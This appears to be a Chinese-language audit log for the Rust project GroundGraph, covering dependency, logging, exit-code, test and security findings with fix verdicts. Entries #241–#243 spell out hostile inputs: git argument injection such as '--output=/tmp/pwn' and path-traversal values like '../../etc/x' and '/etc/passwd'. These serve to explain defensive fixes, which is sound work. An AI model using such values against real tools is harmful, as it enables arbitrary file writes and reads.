- **建议**：`clap = { version = "4", default-features = false, features = ["derive", "std", "help", "usage", "error-context"] }`。

### 228. 14 个 tree-sitter-* + scip/protobuf/rayon 绕开 workspace.dependencies 直接硬编码

> **🟡 判定：部分成立·低收益（2026-06-13 第十一轮）** — tree-sitter*/scip/protobuf/rayon **仅 groundgraph-engine 一个 crate 使用**；`[workspace.dependencies]` 的价值在于"多 crate 共享单一版本源"，单 crate 独占依赖留在该 crate 清单是合理的、无重复风险。集中化属纯组织偏好、无行为/去重收益，保持现状；若未来这些依赖被第二个 crate 引用再上提。

- **位置**：`crates/groundgraph-engine/Cargo.toml:24-37`
- **问题**：workspace 显式声明了 rusqlite/walkdir/globset 等共享依赖，但 engine 里 `tree-sitter = "0.26.9"` 等 14 个、`rayon`、`scip = "0.8"`、`protobuf = "3"` 全部直接写版本号。版本号无单一可信来源；未来 `cargo update -p tree-sitter` 不能在 workspace 层统一推进。
- **建议**：把这 17 个依赖移到 `[workspace.dependencies]`，crate 里只写 `tree-sitter = { workspace = true }`。

### 229. `scip = "0.8"` + `protobuf = "3"` 拉入完整 Google protobuf 运行时反射，GroundGraph 只用 SCIP schema

> **🟠 判定：成立·延后专项（2026-06-13 第十一轮）** — scip 0.8 依赖 protobuf 3 全运行时属实。换 prost 需重写 `scip_runner` 的 SCIP 反序列化（生成代码 + 字段映射）并全量回归 SCIP 精确层，属独立"protobuf→prost"专项；~200KB 体积收益不值得在散修轮承担反序列化重写风险。
> **✅ 已闭环（2026-07-17，TDD + 字节级特征化测试）** — 成立·已迁移 prost。vendor 官方 `scip.proto`（v0.8.1，取自 `sourcegraph/scip`，字段号与原 `scip` 0.8.1 crate 的 rust-protobuf 生成代码逐字段一致）到 `crates/groundgraph-engine/proto/scip.proto`；新增 `build.rs`（prost-build 0.14 + protoc-bin-vendored 3，免系统 protoc、跨平台编译）生成类型到 `OUT_DIR`，经新 `scip_proto` 模块 re-export `Index`/`Document`/`Occurrence`/`Metadata`。重写 `scip_overlay.rs`：`Index::parse_from_bytes` → `prost::Message::decode`，`MessageField<T>` → `Option<T>`，`write_to_bytes` → `encode_to_vec`；移除 `scip`/`protobuf`/`protobuf-support` 运行时依赖。SCIP 精确层行为零变化：`scip_overlay` 8 单测全绿。**TDD/特征化**：先建 `tests/fixtures/scip/sample.scip`（192 字节，旧 rust-protobuf 3.7.2 编码的真实 wire-format fixture）+ 特征化测试断言解码字段；迁移后 prost 解同一 fixture 字段全等，且 prost 重编码与旧 protobuf **字节级完全一致**（同 192 字节、同 SHA256），证实编解码双向兼容、真实 `.scip`（rust-analyzer/scip-go 产）解析不变。`cargo tree` 确认 `scip`/`protobuf`/`protobuf-support` 已从依赖图消失。

- **位置**：`crates/groundgraph-engine/Cargo.toml:36-37`
- **问题**：`scip 0.8.1` 依赖 `protobuf 3.7.2`（完整 C++ 风格运行时反射库）。GroundGraph 只在 `scip_runner` 读 SCIP 索引（pure read），却加载完整 protobuf 反射运行时，release 二进制多 ~200KB + once_cell 全局。
- **建议**：换 `prost` + `prost-build`（纯 Rust，零运行时，编译期 codegen）；或 `protobuf = { version = "3", default-features = false }`。

### 230. 整个 workspace 零 `tracing` / `log` 使用，所有诊断裸 `eprintln!`，无 span/level/target/上下文

> **🟠 已判定·待专项（2026-06-13 第十二轮）** — 成立，与 #127 同主题。引入 tracing 框架属跨切面可观测性专项（#127 已立项），合并跟踪，避免重复散修。
> **✅ 已闭环（2026-07-17，TDD）** — 14 处诊断用 `eprintln!` 迁 `tracing!`（engine 3：config/schema-notice、index config-command notice、requirements_md 重复 req-id；cli 8：logic/business_doc/candidate 警告 + index 的未索引语言/schema-skip/partial-failure + graph focus-miss；mcp 3：ready/client-connected/transport-error）。保留 15 处例外：2 处 `GROUNDGRAPH_TIMING` 门控的 timing 调试行（专用调试开关，格式稳定，门控语义）+ `main` 致命错误行（exit code 前必须无条件 stderr）+ 12 处人员可见的成功/用户错误提示（impact/propose/business_doc/dashboard/search/graph/candidate 的"已写入 X"/"找不到候选"，保持 stderr 通道语义 #111）；mcp server 装自己的 subscriber（stdout 留给 JSON-RPC）。TDD：`index_partial` 的 `-q` 抑制 warn 测试（迁移前 eprintln 不受 `-q` → RED；warn! 级别过滤 → GREEN）+ 默认级别回归。

- **位置**：全仓 `grep "tracing::|log::"` 0 命中；30+ 文件 `eprintln!`
- **问题**：#127 已记缺 --verbose/RUST_LOG，但本条更深：**根本没有 logging 框架**。无 span 关联（哪个 phase/语言/文件）、无 level 过滤、无 target 标签（MCP server 调 groundgraph 时无法区分来源）、无结构化字段。CI 失败时只能拿到一坨无上下文的中文/英文混合 stderr。
- **建议**：引入 `tracing` + `tracing-subscriber`，在 `main()` 装 `EnvFilter::from_default_env()`；`eprintln!("[timing] ...")` 改 `tracing::info!(target: "groundgraph::timing", ...)`。

### 231. `index` 长时操作（18s+）零进度反馈，无 spinner / 无 phase 流 / 无 ETA

> **🟠 判定：成立·可观测性专项（2026-06-13 第十轮）** — 属实但是**功能增量**：需引入 `indicatif`（TTY spinner / 非 TTY 周期进度行）并把 indexer 的 phase 流式上报。与 #127（日志框架）同源，并入可观测性专项设计，不在散修轮落地。
> **✅ 已闭环（2026-07-17，TDD）** — 引入 `indicatif`；engine 加 `ProgressSink` trait + `NoopSink` + `index_repository_with_progress(options, &mut dyn ProgressSink)`（原 `index_repository` 委托传 `NoopSink` 保持向后兼容），`PhaseTimer::mark` 既保留 `GROUNDGRAPH_TIMING` 的 timing 行又 `sink.phase()` 上报 14 个 phase 边界（docs→各语言→scip→links→requirements_md→fulltext→commit）。CLI `index` 用 `IndexProgress`：TTY 时 `ProgressDrawTarget::stderr()` + spinner + steady tick，非 TTY `hidden()`（indicatif hide 惯例），draw_target 恒为 stderr 不污染 `--format json` stdout。TDD：`progress` trait unit（3）+ `index.rs` 内嵌 `phase_timer_forwards_each_marked_phase_to_the_sink`（mark→sink 序列）+ `tests/index_progress` 集成（docs→fulltext→commit 顺序断言）+ `index_partial` stdout-干净 e2e。

- **位置**：`crates/groundgraph-cli/src/commands/index.rs:7-15`
- **问题**：`groundgraph index` 在 spring/django/typescript 仓运行期间 stdout/stderr 完全静默直到结尾 dump。用户在 CI 看到 30 秒"程序卡死"然后突然一堆输出。PhaseTimer 只在 `GROUNDGRAPH_TIMING=1` 时事后输出。
- **建议**：引入 `indicatif`（TTY-aware）：TTY 显示 spinner + 当前 phase；CI（非 TTY）降级为每 5s `[progress] phase=python files=1234/5678`。

### 232. indexer 部分失败（schema skip / parse timeout / SCIP Failed）退出码仍 0，CI 受骗

> **🟠 判定：成立·需专项（2026-06-13 第十轮）** — CI 受骗属实，但修复需贯通改造：在 `IndexResult` 增 `partial_failures: Vec<PartialFailure>`、各 indexer 失败路径回填、`index` 命令据此返回退出码 2 并加 `--fail-on-partial` flag。涉及 engine 公共结构 + 退出码契约（与 #233 耦合），且需相应 e2e 测试，属独立 PR，不在散修轮夹带。
> **✅ 已闭环（2026-07-17，TDD）** — `IndexResult` 增 `partial_failures: Vec<PartialFailure>`，`index_repository` 末尾经纯函数 `collect_partial_failures`（从 `treesitter[].parse_timeouts` + `scip_runs[].Failed` 收集）回填；CLI `index` 再折叠 schema-indexer 失败，打印每项 `indexer: reason` 汇总，按 `--fail-on-partial`（默认 true）返回 exit 2（UserError），`watch` 调用传 false 不中断。TDD：engine 单测 `collect_partial_failures_*`（stub→实现 RED-GREEN）+ `tests/index_partial.rs`（parse-timeout 场景 exit 2 / `--fail-on-partial=false` exit 0 / 干净仓 exit 0）。

- **位置**：`crates/groundgraph-cli/src/commands/index.rs:71` + `:216-223` + `engine/src/index.rs:417-422`
- **问题**：多个 indexer 失败只产生 stdout/stderr 文本，不影响退出码：schema indexer 失败 → `eprintln!("Schema index skipped...")` 但 `run` 返回 `Ok(())`；SCIP `Failed(reason)` 仅在 result 摘要。CI 的 `if groundgraph index; then ...` 把"部分成功的索引"当完全成功。
- **建议**：`IndexResult::partial_failures: Vec<PartialFailure>`；CLI 有部分失败时返回退出码 2；`--fail-on-partial` flag。

### 233. 退出码语义不统一——"user error"/"not found"/"internal error" 全用 1，只有 candidate-show 用 2

> **🟠 判定：成立·跨切面专项（2026-06-13 第十轮）** — 属实但是跨全 CLI 的退出码契约设计（typed 0/2/64/65/70/72/76），需统一所有 runner 的错误分类并文档化，且与 #115/#232 耦合。属独立"退出码语义"PR，不在散修轮逐处改。
> **✅ 已闭环（2026-07-17，TDD）** — 落地统一退出码契约 `0 成功 / 2 用户错误 / 70 内部`（简化自原 7 档建议，少而明确；`docs/cli-exit-codes.md` + `--help` after_help 尾注）。新增 `exit_code.rs`（`UserError` + `classify`）：main 错误分支一处集中映射——遍历 cause chain 的 `EngineError::kind()`（`UserInput`/`NotFound`→2，`Operational`/`Internal`→70）+ 裸 `io::NotFound`→2 + 显式 `UserError`→2，替换「几乎全 1」；`check`/`connect`「发现问题」退出码统一到 2，`candidate show` 的 2 保持兼容。TDD：`tests/exit_codes.rs`（clap 错误 / no-workspace / operational / candidate-not-found 分别断言 2 与 70）+ `exit_code::tests`（classify 单测 8 例）。

- **位置**：`crates/groundgraph-cli/src/main.rs:1001-1010` + `commands/candidate.rs:58`
- **问题**：退出码无文档化语义：配置文件不存在 → 1；`candidate show <bad-id>` → 2；数据库不存在 → 1；任何 `?` 冒泡 → 1。sysexits.h 约定 64-78 区分。CI 脚本无法靠退出码区分"用户写错参数"vs"数据库损坏"。
- **建议**：typed 退出码：0=success, 2=not-found, 64=usage, 65=config/data, 70=internal, 72/76=io/sqlite。

### 234. 至少 9 个 `GROUNDGRAPH_*` 环境变量散布 8 个文件，无清单 / 无 --help / 无 docs 汇总

> **🟠 判定：成立·治理专项（2026-06-13 第十轮）** — 属实但属文档/治理增量：把 9 个 `GROUNDGRAPH_*` 集中到 `env.rs` 注册表 + `--help` 加 `Environment:` 段 + 新增 `environment.md`。机械但跨多文件，且更适合与可观测性/治理一并推进，非缺陷，留专项。
> **✅ 已闭环（2026-07-17，TDD）** — 新建 `crates/groundgraph-cli/src/env.rs`：`REGISTRY`（14 项 `GROUNDGRAPH_*`，`EnvSpec` 含 name/default/category/help）+ `render_environment_help()` 按 category 分组生成；`GROUNDGRAPH_SCIP_<LANG>_BIN` 用 `<LANG>` 占位符表动态 family，`GROUNDGRAPH_GOLDEN_REQUIRED` 标 `Test` category 在用户 `--help` 隐藏。`--help` 的 `after_help` 改由 `after_help_text()` 运行期拼接（#128 Categories + #233 Exit codes + #234 Environment），builder 覆盖 derive（注册表运行期才解析）；`docs/environment.md` 汇总（含 Test-only 段）。TDD：`env::` 5 例（覆盖 grep 全部变量 / 去重 / 前缀 / render 含 header 且隐藏 Test，RED 空 REGISTRY → GREEN）+ `help_grouping` 的 Environment 段 e2e。注：`GROUNDGRAPH_GO_LSP_BIN` 已退役（Go 走 tree-sitter + scip-go），注册表反映现状不含它。

- **位置**：`GROUNDGRAPH_TIMING`（index.rs:136）+ `GROUNDGRAPH_SWIFT_LSP_BIN`（swift_indexer.rs:34）+ `GROUNDGRAPH_GO_LSP_BIN`（config.rs:672）+ `GROUNDGRAPH_SCIP_<LANG>_BIN`（scip_runner.rs:101）+ `GROUNDGRAPH_PARSE_BUDGET_MS`（treesitter.rs:406）+ `GROUNDGRAPH_LOUVAIN_RESOLUTION`（business_pack.rs:847）+ `GROUNDGRAPH_DART_ANALYZER[_BIN/_TIMEOUT_SECS]`（dart_sidecar.rs:38-50）+ `GROUNDGRAPH_REPO_ROOT`（mcp/main.rs:52）
- **问题**：9 个环境变量分散 8 个源文件，无统一注册表、无 `--help` 列出、无 docs 汇总。用户得 grep 源码才能发现 `GROUNDGRAPH_PARSE_BUDGET_MS` 可调慢解析预算。命名也不统一：`_BIN`/`_TIMEOUT_SECS`/`_MS`/`_RESOLUTION`/`TIMING` 混用。
- **建议**：集中到 `crates/groundgraph-engine/src/env.rs`，每个带 doc comment；`--help` 加 `Environment:` 段；docs 新增 `environment.md`。

### 235. `migrations.rs::apply_all` 的部分迁移、版本跳跃、SQL 错误路径零测试

> **✅ 已闭环（2026-06-13 第十轮，TDD）** — 成立。`apply_all` 抽出 `pub(crate) apply_list(conn, &[Migration])` 以注入合成迁移；新增单测 `apply_list_rolls_back_failed_migration_and_does_not_advance_version`（SQL 错误回滚、version 不前进、已建表保留/失败表不存在）与 `apply_list_resumes_without_reapplying_already_applied_versions`（部分应用后续跑幂等）；集成 `migration_creates_expected_indexes` 断言 002 的 7 个索引齐全且 0 触发器（FTS 整表重建无触发器，属设计）。

- **位置**：`crates/groundgraph-store/src/migrations.rs:35`
- **问题**：`tests/migrations.rs` 只有 2 个测试——`migration_creates_all_expected_tables` 和 `migration_is_idempotent`。`EXPECTED_TABLES` 仅断言表名，不断言索引（4 个）、CHECK 约束、NOT NULL、触发器、`node_fts` 的 `content=` 绑定。未覆盖：(a) v1 应用一半失败后 schema_version 是否记录；(b) 跳跃应用（v0→v3）是否幂等；(c) `apply_all` 返回 Err 时事务回滚。
- **建议**：加 3 个测试：`partial_migration_does_not_advance_schema_version`、`migration_creates_expected_indexes_and_triggers`、`apply_all_rolls_back_on_sql_error`。

### 236. 6 个 Dart golden 测试文件复制粘贴 ~100 行 EnvGuard + copy_fixture + setup_indexed_repo 脚手架，零共享

> **🟠 已判定·待专项（2026-06-13 第十二轮）** — 成立。抽共享 test helper 是纯测试重构（无行为变更但有打断 6 个 golden 的风险），单列测试 DRY 专项。
> **✅ 已闭环（2026-07-17，纯测试重构）** — 抽 `crates/groundgraph-engine/tests/common/mod.rs`：路径/探测 helper（`workspace_dir`/`fixture_dir`/`sidecar_path`/`copy_fixture_into`/`dart_available`/`sidecar_source_present`）+ 高阶 `setup_indexed_dart_repo(ctx, fixture, code_roots)`（封装 `dart_golden_ready` 门控 + sidecar env + init/copy/migrate/index_dart + resolver 断言）+ `EnvGuard`/`env_lock`（acceptance 专用，两个测试 flip env 相反方向故不能套 Once 模式）。6 个文件（p4/p5/p7_dead_code/p8/p9/dart_sidecar_acceptance）逐个迁移到共享模块，每文件保留语义 thin wrapper，soft-skip 行为不变（`dart_sidecar_acceptance` happy-path 的 `eprintln!` 老路径统一到 `dart_golden_ready` 的 stdout/可选硬失败）；修正 common 原有 `dart_golden_ready` 里重复 `&& var_os().is_none()` 笔误。24 个 golden 测试全绿（sidecar 实跑）。

- **位置**：`crates/groundgraph-engine/tests/{p4_pixcraft_golden,p5_search_golden,p7_dead_code_golden,p8_semantic_edges,p9_business_candidates,dart_sidecar_acceptance}.rs`
- **问题**：6 份独立 `EnvGuard`/`copy_fixture_into`/`dart_available`/`sidecar_source_present`。`tests/` 无 `common.rs`/`mod support`/`harness.rs`。6 处独立修复点——改一处要改 6 处。
- **建议**：抽 `crates/groundgraph-engine/tests/common/mod.rs`（dev-dependency 共享）。

### 237. 生产代码无 NUL 字节防护，但 store proptest 显式排除 NUL——隐含已知约束未在生产侧落地

> **🟢 不成立（2026-06-13 第十轮，实测）** — proptest 排除 NUL 是 proptest 字符串生成约定，非生产约束。观察性测试实证：`upsert_node`/`find_node` 对含 `\0` 的 ArtifactId 经 rusqlite/SQLite TEXT 列**无损 roundtrip**（无错误、无截断），故"生产无 NUL 防护会出问题"不成立；观察性测试已移除、注释更正。

- **位置**：生产 `repositories.rs:111-130`（`upsert_node` 直接 `params![id.as_str()]`）对比 `tests/proptest_roundtrip.rs:21` 注释 "Arbitrary UTF-8 excluding NUL"
- **问题**：测试已知道 SQLite 不能存 NUL，但生产代码无 `if id.contains('\0') { return Err(...) }`。文件名在 Linux/macOS 可含 NUL（罕见），indexer 读到后 `params!` 让 SQLite 返回 `SqliteFailure`，错误信息不友好。
- **建议**：`Store::upsert_node`/`upsert_edge`/`upsert_evidence` 在 params! 前 `check_no_nul(&id)?`。

### 238. fixture 缺 csharp / ruby / php / kotlin / cpp / c 这 6 门语言的独立目录

> **🟠 已判定·待专项（2026-06-13 第十二轮）** — 成立。补这 6 门 tree-sitter 的真实端到端样本仓属测试语料扩充工程，单列 fixture 专项。
> **✅ 已闭环（2026-07-17，TDD）** — 补 `csharp_hello` / `ruby_hello` / `php_hello` / `kotlin_hello` / `cpp_hello` / `c_hello` 六个 fixture 目录（每目录 2–3 真实源文件，含跨文件结构与同文件 Calls 边），新增 `breadth_fixtures_golden.rs` 端到端金标：复制 fixture → `index_repository` → 断言关键节点（类/方法/函数/结构）+ Calls 边存在。`csharp_hello` 兼作 #125 的 LINQ/partial 金标本。

- **位置**：`tests/fixtures/`（只有 pixcraft_iap/flutter_watermark_app/typescript_hello/python_hello/java_hello/go_hello/swift_hello）
- **问题**：wave3 的 csharp/ruby/php/kotlin 测试在 p22 用**内联字符串**（`write(root, "src/Greeter.cs", "...")`）而非 fixture。inline fixture 体积小（30-200 字节），无真实框架代码（无 ASP.NET/Rails/Laravel/Spring Boot），无法触发 framework 路由解析器回归。这 6 门端到端覆盖深度远低于另外 7 门。
- **建议**：补 6 个 fixture 目录（每个 ~200 行真实框架代码），把 p22 wave3 从 inline 字符串迁到 fixture。

### 239. 测试命名风格三套并存：`feature_condition_expected` / `p[0-9]+_feature` / `check_NN_feature`

> **🟡 吹毛求疵·待专项（2026-06-13 第十二轮）** — 成立但纯命名风格，不影响正确性；统一命名是大面积低收益 rename，留风格专项，不在散修轮动。
> **✅ 已闭环（2026-07-17，规范文档化）** — `CONTRIBUTING.md` 新增测试命名规范：`unit`/`golden`/`integration` 三类 + `feature_under_test_condition_expected_outcome` 约定，参照 `apply_list_rolls_back_failed_migration_and_does_not_advance_version` / `sqlite_value_to_json_collapses_non_finite_reals_to_null` / `slice_requirement_missing_workspace_errors_with_message` 等良好样例。机械迁移扫描全 workspace 1501 个测试：无 `test1`/`misc`/`works` 类明显偏离（短名仅源码字符串内的 `it_adds` 误匹配）；现存 `p[0-9]+_*`(57)/`check_NN_*`(20) 均带完整 feature 描述（如 `p7_dead_code_lists_unreached_pixcraft_symbols_with_confidence`、`check_01_top_level_function_calls_class_method`，语义清晰），按本条 verdict 留风格专项不做大面积 rename。

- **位置**：抽样对比 `end_to_end_paths.rs:slice_requirement_missing_workspace_errors_with_message`、`p7_dead_code_lists_unreached_pixcraft_symbols_with_confidence`、`code_facts_extended.rs:check_01_top_level_function_calls_class_method`
- **问题**：三套命名让 `cargo test -- --list` 输出混乱，新成员不易搜到要扩展的测试。
- **建议**：制定 `feature_under_test_condition_expected_outcome` 规范并逐步迁移。

### 240. `clap_derive` 4.6.1 与 `clap_builder` 4.6.0 版本号不对齐，暴露 lock 未锁到精确 minor

> **🟡 判定：吹毛求疵（2026-06-13 第十一轮）** — clap_derive 4.6.1 / clap_builder 4.6.0 的 minor 不对齐是上游常态，二者由 clap 元 crate 协调 API 契约，无实际解析风险；**`Cargo.lock` 已精确锁定**两者版本，CI 新增 `--locked`（#226）即 drift 守卫。无需改动。

- **位置**：`Cargo.lock:175-187`
- **问题**：上游 minor 不对齐是常态，但 GroundGraph 以"确定性"为卖点，配合 #226 宽版本号，下一次 `cargo update -p clap_builder` 可能拉到 4.6.x 而 clap 仍在 4.6.1，解析行为可能微变。
- **建议**：CI 加 `cargo update --dry-run` 检查无 drift。

---

## 第七批统计

**新增 30 个**（编号 #211–#240）：High 12 / Medium 15 / Low 3。

| 主题 | 涉及条目 |
|---|---|
| **依赖供应链**（0.0.x 不稳定、unsafe 传递、bundled 漂移、重复依赖、宽版本号、feature 滥用、workspace 不统一、protobuf 运行时） | #211–#213, #223–#229, #240 |
| **observability/运维**（stderr inherit、错误归一、并发锁、重试、WAL、tracing、进度、退出码、环境变量） | #214–#218, #230–#234 |
| **测试覆盖盲区**（CLI 零 e2e、dart 无 proptest、src 无 cfg(test)、MCP 工具未调用、迁移测试、脚手架复制、NUL 防护、fixture 缺语言） | #219–#222, #235–#238 |

**最值得优先修复的 5 个（第七批）**：
1. **#212（unsafe-libyaml 精神冲突）**——以禁 unsafe 自居却引入名为 unsafe-* 的传递依赖，配合 #70 一起作为 serde_yaml 迁移专项
2. **#216（并发 index 无文件锁）**——CI 误用 matrix 时半迁移 db
3. **#219（10 个 CLI 命令零 e2e）**——port-coverage 等商业卖点核心命令无回归保护
4. **#221（38 个 src 无 cfg(test)）**——config.rs/migrations.rs 等核心逻辑只靠端到端
5. **#222（4 个 MCP 工具从未被 tools/call 调用）**——serde 字段重命名让 explain_symbol 返回 `{}`，CI 仍绿

---

## 第八批（#241–#270，2026-06-14 第十五轮审查·新发现）

> **状态**：本轮 30 项已逐个核实并 TDD 处理完毕（2026-06-14）。除两项标 🟠 待专项/单独 PR 外，其余均已修复或核实为按设计/无害防御，全仓 `cargo clippy` 零告警、相关测试全绿。
>
> **分级**：High 1 / Medium 9 / Medium-Low 4 / Low 10 / 吹毛求疵（Nit）6。

> **本批处理结论（逐条 verdict）**
>
> | 区段 | 处理 |
> |---|---|
> | #241 git_diff 参数注入 | ✅ 修复：`ensure_safe_ref` 拒绝 `-` 开头 ref |
> | #242 storage.path 逃逸 | ✅ MCP `resolve_db_path` 加 `..` 守卫（远程攻击面）；绝对路径按设计；引擎内 ~22 份副本的统一收敛见 #263 🟠 |
> | #243 context_pack 穿越 | ✅ 修复：`read_snippet` 读前 confine（拒绝绝对/`..`） |
> | #244 atomic_write 耐久 | ✅ 修复：临时文件 `sync_all` + 父目录 fsync |
> | #245 OOM 门铺全 | ✅ 修复：`read_node_source`/similarity/dart_indexer/data_contract 接入 `is_oversized_source` |
> | #246 Markdown 围栏 | ✅ 修复：`parse_markdown` 跟踪 ``` / `~~~` 围栏 |
> | #247/#248 impact 测试判定 | ✅ 修复：改用 `path_class::is_test_path` + pytest `test_` 前缀 |
> | #249 LSP 头封顶 | ✅ 修复：`MAX_HEADER_LINE_BYTES` 上限 |
> | #250 stats 无界 | ✅ 修复：8MiB 轮转 + 流式聚合 |
> | #251 edge id 碰撞 | ✅ 修复：`from` 长度前缀消歧 |
> | #252 unwrap/expect throws | ✅ 修复：`unwrap`/`expect` 仅 Rust 计入 throws |
> | #253 kill_tree PID 复用 | 🟢 核实非活跃：调用点均 `Option::take` 或仅存活时单次击杀；强化 `kill_tree` 契约文档 |
> | #254 commit_bulk 不 ROLLBACK | ✅ 修复：COMMIT 失败补 best-effort ROLLBACK 复位（失败路径无法单测确定性触发，按 #244 同例） |
> | #255 slugify 碰撞 | 🟢 slugify 按设计；危害面（doc/需求 ID）已在 #246 索引器去重 + #264 跨文件告警中覆盖 |
> | #256 SQL IO 标记失效 | ✅ 修复：移除 `strip_noise` 后永不命中的死 SQL 词表（调用点标记仍在；复活会误判 query builder） |
> | #257 python 路由解析 | ✅ 修复：`first_string_literal` 取首个完整字面量（逗号/空串/原始串前缀） |
> | #258 dart_sidecar `#` 吞 | ✅ 修复：`shlex` 空结果时非空覆盖回退空白切分，不静默回退裸 `dart` |
> | #259 Dart 插值花括号 | ✅ 修复：`update_depth` 识别 `${…}` 跳插值（含嵌套引号/花括号） |
> | #260 feature_map 死代码 | ✅ 修复：删 BFS 不可达分支；`try_from` 保留（clippy 禁 `as` 截断，注释说明） |
> | #261 callers.clone | ✅ 修复：去掉多余 clone，直接借用迭代 |
> | #262 split().next().unwrap_or | 🟢 接受：`split`/`rsplit` 必产 ≥1，兜底不可达但无害（防御性） |
> | #263 resolve_storage_path DRY | 🟠 待专项：实测 ~22 份副本，收敛为单一 `confine_under_root` 是独立重构 PR；安全要害已在 #242 的 MCP 边界封堵 |
> | #264 跨文件重复需求 ID | ✅ 修复：索引收集首见文件，跨文件重复 → `duplicate_ids` + 告警 |
> | #265 constants hex e/E | 🟢 接受：仅内部判定瑕疵，分类结果不变（issue 自述无正确性影响） |
> | #266 graph max_nodes 语义 | ✅ 文档化：`max_nodes` 限模型规模而非可见数（注释说明 truncate→apply_view 次序） |
> | #267 Rfc3339 format 死兜底 | 🟢 接受：合法 `OffsetDateTime` 用 Rfc3339 不会失败，兜底不可达但无害 |
> | #268 scip index.scip 误移 | ✅ 修复：运行前快照 `(mtime,len)`，仅移动本次新写的 index.scip，保留预存/陈旧文件 |
> | #269 scip 测试 env 竞态 | ✅ 修复：`run_indexers_with` 注入式 probe，测试不再改写进程 env |
> | #270 git_diff 重命名漏旧路径 | ✅ 修复：解析 `rename to`/`copy to`，新增 `Renamed` 状态 |

| 主题 | 涉及条目 |
|---|---|
| **安全**（参数注入、路径穿越、任意读写） | #241, #242, #243 |
| **健壮性/耐久性/OOM** | #244, #245, #249, #250, #268 |
| **解析/索引正确性**（围栏、ID 碰撞、重命名、重复 ID） | #246, #251, #255, #264, #270 |
| **跨语言覆盖盲区**（impact 仅认 Dart 测试） | #247, #248 |
| **启发式准确性**（纯度/路由/sidecar/Dart 解析） | #252, #256, #257, #258, #259 |
| **并发/事务/进程/测试卫生** | #253, #254, #269 |
| **代码味道/吹毛求疵**（死兜底、死分支、DRY、UX） | #260, #261, #262, #263, #265, #266, #267 |

**最值得优先处理的 5 个**：
1. **#241（git_diff `--output=` 参数注入）**——MCP `impact` 的 `base`/`head` 远程可达，可写任意文件（High）
2. **#247/#248（impact 测试判定仅认 Dart）**——非 Dart 仓"改码未改测试"告警**系统性误报**，且 `tests/`/`_test.go`/`test_*.py` 全漏
3. **#243（context_pack 经 node.path 任意读）**——恶意/受污染图可让 MCP 客户端读到仓库外文件
4. **#245（OOM 大小门未铺全）**——#186 的修复未覆盖 `read_node_source` 等热点直读路径
5. **#246（Markdown 围栏未跟踪）**——代码块内 `#` 生成幽灵 DocSection，与 `parse_requirements`/`parse_adoc` 不一致

### 241. `git_diff` 参数注入：`base`/`head` 以 `-` 开头可触发 `git diff --output=<任意路径>` 任意文件写

> **🔴 待修复（High，安全）** — MCP `impact` 工具远程可达，属真实攻击面。

- **位置**：`crates/groundgraph-engine/src/git_diff.rs:37-48`（`diff_args`）、`:53-59`（`git_diff` 拼 argv）；远程入口 `crates/groundgraph-mcp/src/tools/impact_tool.rs`（`base`/`head` 直传）
- **问题**：`diff_args` 把 `base`/`head` 原样作为位置参数交给 `git diff`，无 `--` 分隔、无"不得以 `-` 开头"校验。两个分支都可注入：(1) `head` 为空 → `args.push(base)`，`base="--output=/tmp/pwn"` 得 `git diff --unified=0 --no-color --output=/tmp/pwn`，git 把 diff 写入任意文件；(2) `head` 非空 → `format!("{base}..{head}")`，`base="--output=x" head="y"` 得单参 `--output=x..y`，git 仍解析为 `--output` 写文件 `x..y`。`git diff` 还支持 `--output`、`-O<orderfile>`（读任意文件）等危险选项。
- **触发场景**：MCP 客户端调用 `impact` 传 `base="--output=/Users/victim/.zshrc"`；或恶意 `.groundgraph` 集成把 ref 传进来。
- **建议**：调用前校验 `base`/`head` 不以 `-` 开头（或用 `git rev-parse --verify --quiet <ref>` 预校验），并在 argv 中显式插入 `--` 终止选项解析；MCP 侧对 ref 做白名单字符集校验。

### 242. `resolve_db_path` / `resolve_storage_path` 不约束 `storage.path`：绝对路径与 `..` 逃逸（与同仓 #199 路径约束不一致）

> **🔴 待修复（Medium，安全/一致性）** — #199 已为 `links.path` 加 `confine_manifest_path`，但 `storage.path` 在 5+ 处仍裸用。

> **✅ 已闭环（2026-07-17，TDD）** — 引擎侧残余补齐：`..` 守卫从 MCP 边界下沉到共享的 `groundgraph_core::paths::confine_under_root`，engine `resolve_storage_path` 随之改返回 `Result<PathBuf>` 并同样拒绝 `..` 逃逸；绝对路径按设计保留为显式算子 opt-in（引擎/MCP 一致）。MCP 侧以 `open_store_rejects_a_storage_path_escaping_the_repo` / `open_store_honours_an_absolute_storage_path` 两条 e2e 钉住入口行为。

- **位置**：`crates/groundgraph-mcp/src/tools/mod.rs`（`resolve_db_path`）；`crates/groundgraph-engine/src/connect.rs:562-569`（`resolve_storage_path`）；`index.rs` / `schema_indexer.rs` / `network.rs` 各自的同名副本
- **问题**：`resolve_db_path`/`resolve_storage_path` 对 `config.storage.path`：绝对路径**原样采用**，相对路径 `repo_root.join(raw)` **不过滤 `..`**。被污染的 `.groundgraph.yaml`（`storage.path: ../../etc/x` 或 `/etc/x`）可让 GroundGraph 在仓库外创建/写 SQLite 文件。对照 **同一个 `connect.rs`** 里 `confine_manifest_path`（#199）对 `links.path` 已拒绝绝对路径与 `..`——同文件双标准。
- **触发场景**：克隆含恶意 `.groundgraph.yaml` 的仓库后运行 `groundgraph index`；MCP 服务指向不可信仓库根。
- **建议**：抽出单一 `confine_under_root(repo_root, raw)`（复用 #199 逻辑），所有 `storage.path` 解析点统一调用；绝对路径要么拒绝、要么显式 opt-in。

### 243. MCP `context_pack::read_snippet` 经 `node.path` 路径穿越 → 读取仓库外任意文件

> **🔴 待修复（Medium，安全）** — 图数据库内容被视为可信，但它可由索引外部输入/旧库污染。

- **位置**：`crates/groundgraph-mcp/src/tools/context_pack.rs`（`read_snippet`，`repo_root.join(rel_path)`）
- **问题**：`read_snippet` 直接 `repo_root.join(node.path)` 读文件。若图中某节点 `path` 为绝对路径（`/etc/passwd`）或含 `..`，`PathBuf::join` 对绝对路径会**丢弃 `repo_root`**，对 `..` 会上溯目录——读到的内容随 `context_pack` 返回给远程 MCP 客户端。虽有 `SNIPPET_MAX_FILE_BYTES`（#88）限大小，但穿越本身未拦。
- **触发场景**：恶意/损坏的 `graph.db`（外部工具写入、跨机拷贝）含 `path: ../../secret`；或某语言适配器把绝对路径写进 `node.path`。
- **建议**：读前 `confine_under_root`；或断言 `node.path` 为相对且 normalize 后仍在 `repo_root` 内，否则跳过并记 finding。

### 244. `atomic_write` 缺 `fsync`：临时文件与父目录均未刷盘，"掉电原子/耐久"声明不成立

> **🔴 待修复（Medium，耐久性）** — 仅做了 rename 原子性，未做 durability。

- **位置**：`crates/groundgraph-engine/src/atomic_write.rs`（`write_atomic`：写临时文件 → `persist`/rename）
